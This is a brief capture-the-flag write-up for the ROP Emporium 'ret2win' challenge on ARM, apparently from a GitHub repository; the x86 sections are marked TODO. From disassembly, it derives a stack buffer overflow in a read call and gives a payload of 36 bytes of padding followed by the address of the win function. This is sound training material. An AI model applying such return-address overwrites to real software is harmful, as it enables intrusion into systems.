# ret2win

## x86_64: (TODO)

## x86: (TODO)

## ARM:
```asm
00010570 <pwnme>:
   10570:	e92d4800 	push	{fp, lr}
   10574:	e28db004 	add	fp, sp, #4
   10578:	e24dd020 	sub	sp, sp, #32
```
The `pwnme` function prologue declares 32 bytes of stack.   
`fp = old_sp + 4, sp = old_sp - 32` so `sp = fp - 36`.
```asm
000105b0 <pwnme + 0x40>:
   105b0:	e24b3024 	sub	r3, fp, #36
   105b4:	e3a02038 	mov	r2, #56
   105b8:	e1a01003 	mov	r1, r3
   105bc:	e3a00000 	mov	r0, #0
   105c0:	ebffff80 	bl	103c8 <read@plt>
```
Then, the read function is called like this:   
`read(0, fp - 36, 56)`  
There is a 24 byte buffer overflow that allows us to overwrite `pc`
```asm
000105d0 <pwnme + 0x60>:
   105d0:	e24bd004 	sub	sp, fp, #4
   105d4:	e8bd8800 	pop	{fp, pc}
```
At the end, `sp` is restored to its old value and then are popped `fp` and `pc`.   
Thus, to redirect the execution, we need to write an address 36 bytes after `sp`.

We have `000105ec <ret2win>` so the final payload is:   
- PADDING (36 bytes)
- 0x105ec

![exploit](https://github.com/Arkturius/ROPEmporium/blob/markdown/.resources/ret2win_exploit.png)
